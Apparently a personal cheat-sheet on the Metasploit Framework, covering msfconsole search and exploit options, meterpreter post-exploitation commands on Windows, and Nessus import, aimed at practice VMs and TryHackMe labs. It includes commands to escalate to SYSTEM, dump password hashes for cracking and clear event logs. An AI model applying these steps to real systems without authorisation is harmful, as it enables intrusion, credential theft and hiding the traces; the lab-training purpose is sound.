# metasploit

<hr class="sl">

## Introduction

<div class="row row-cols-md-2"><div>

The [Metasploit Framework](https://github.com/rapid7/metasploit-framework) is a penetration testing framework that you can use to test your systems.

If you want to test your skills, download the Vulnerable OS [Metasploit 2](https://docs.rapid7.com/metasploit/metasploitable-2/), or [Metasploit3](https://github.com/rapid7/metasploitable3). You can install it on a VM.

* **Username**: `msfadmin`. **Password**: `msfadmin`
* Before the keyword is using QWERTY. You can swap once logged (`sudo loadkeys fr`).

</div><div>

Metasploit is divided into modules

* **Encoders**
* **Evasion**
* **Exploits**
* **NOPs**
* **Payloads** <small>(single/inline, and not inline)</small>: how the framework will send data
* **Post**: scripts to start the meterpreter, or convenient functions such as `hashdump`.

> **Auxiliary**, if available, can be used to check if an exploit can be used on a target.
</div></div>

<hr class="sr">

## msfconsole

<div class="row row-cols-md-2"><div>

This is a console in which you can search an exploit, test if the target is vulnerable, and use the exploit on the target.

Start the console

```bash
$ msfconsole -q
msf6 >
```

Search an exploit. It returns a list of modules, with an index, and a name, that can be "used" later.

```bash
msf6 > search word1 word2 # simple search for words in name/description
msf6 > search service # ex: apache, ftp...
msf6 > search module # ex: exploit/windows/http/xxx
msf6 > search CVE-YEAR-ID
msf6 > search type:auxiliary # search auxiliaries
msf6 > search platform:... 
```

Use an exploit

```bash
msf6 > use module_name # ex: exploit/windows/http/xxx
msf6 > use module_index # ex: 0
```
</div><div>

See the options required by the module. Find properties marked "required", but with no default value.

```bash
msf6 exploit('module_used') > options
msf6 exploit('module_used') > show options # same
# set an option
msf6 exploit('module_used') > set <option> <value>
```

<details class="details-e">
<summary>Usual modules options</summary>

* `set LHOST <value>`: ip of the attacker
* `set RHOST(s) <value>`: ips of the defenders
* `set RPORT <value>`: port of the defender
* `set TARGETURI <value>`: an URI (ex: location to a script)
* `set use <module>`: use another module
* `set PAYLOAD <value>`: use another module
</details>

Once ou filled everything you need to, run the exploit. If you were successful, a meterpreter will be created allowing you to access a short of enhanced <small>(with more features)</small> shell of the target.

```bash
msf6 exploit('module_used') > run
msf6 exploit('module_used') > exploit # same
# ...
# if you were successful
meterpreter >
```
</div></div>

> **TryHackMe note**: you need to start the VPN on the host, and use `set LHOST tun0`, or the correct network interface used by the VPN.

<br><br>

📌 Advanced usage 📌

<div class="row row-cols-md-2"><div>

You can ask for "help"

```bash
msf6 exploit('module_used') > help set
```

You can see the history of the command you used

```bash
msf6 exploit('module_used') > history
```

If you don't plan to use an exploit, you can go back

```bash
msf6 exploit('module_used') > back
msf6 > 
```

You can check if an exploit is available before running it. It will only work if there is an auxiliary for this exploit.

```bash
msf6 exploit('module_used') > check
```
</div><div>

If you want to unset a variable, or all variables...

```bash
msf6 exploit('module_used') > unset RHOSTS
msf6 exploit('module_used') > unset all
# even if you go back, every module with have
# this value for RHOSTS, unless, you use unset
msf6 exploit('module_used') > setg RHOSTS xxx
```

See, and use another payload

```bash
msf6 > show payloads
msf6 > set payload 1
msf6 > set payload payload_name
```

You can request info about an exploit/...

```bash
msf6 > info module_name # ex: exploit/windows/http/xxx
msf6 > info module_index # ex: 0
```
</div></div>

<hr class="sl">

## Meterpreter on Windows

<div class="row row-cols-md-2"><div>

You can use many Linux commands

```bash
meterpreter > ls # list files
meterpreter > cd # move
meterpreter > pwd # path to current folder
meterpreter > cat file # print file
meterpreter > edit file # open file in vim
```

And there are quite a lof of useful "post" modules

```bash
meterpreter > shell # start a shell
C:\WINDOWS\system32> whoami
meterpreter > getsystem
meterpreter > sysinfo
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM # means that you're an admin
meterpreter > hashdump # dump usernames/password...
# try to bruteforce NTML with john format=nt
meterpreter > clearev # clean logs
```
</div><div>

```bash
meterpreter > idletime # time the host was idle
meterpreter > ipconfig # network information
meterpreter > search -f pattern # search file by pattern
meterpreter > search -f pattern from* # ... inside given directories
meterpreter > download c:\\path # download to your machine
meterpreter > upload local_file c:\\path # upload
```
</div></div>

<hr class="sr">

## msfconsole, and nessus

<div class="row row-cols-md-2"><div>

To be honest, it was way more useful to explore results in nessus web interface, but if you don't have one, then this is surely something useful.

![nessus_exploit_with](_images/nessus_exploit_with.png)

First, start a msf database

```bash
$ sudo systemctl start postgresql
$ sudo msfdb init
# I got some errors, but it still works
```

Then in your msfconsole

```bash
$ msfconsole -q
msf6 > db_status # check if connected
[*] Connected to msf. Connection type: postgresql.
```
</div><div>

Everything below is coming from [this tutorial](https://scubarda.com/2015/11/16/launching-nessus-scans-inside-metasploit/).

```bash
msf6 > load nessus
# Connect
msf6 > nessus_connect user:pass@localhost:8834
# List the scans that you did
msf6 > nessus_scan_list
# Import the result of a scan
msf6 > nessus_db_import id_you_found_in_the_list
```

Once you did, there a few commands you can use

* `services`: see what services the target run
* `vulns`: see vulnerabilities
* `vulns -s ftp`: see ftp vulnerabilities
* `vulns -S keyword`: see vulnerabilities including keyword

Then, process as usual.
</div></div>